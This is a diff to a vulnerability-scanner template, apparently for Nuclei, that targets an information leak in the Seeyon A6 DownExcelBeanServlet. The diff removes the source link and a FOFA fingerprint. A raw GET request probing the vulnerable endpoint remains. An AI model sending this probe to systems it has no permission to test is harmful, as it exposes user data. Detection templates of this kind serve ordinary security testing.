@@ -3,12 +3,8 @@ info:
   name: 致远A6 DownExcelBeanServlet存在信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ny8toi8dmgitzue8'
+  description: ''
   tags: info-leak,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ny8toi8dmgitzue8
-    fofa: app="致远A6"
 http:
 - raw:
   - 'GET /yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=0&per_id=0 HTTP/1.1
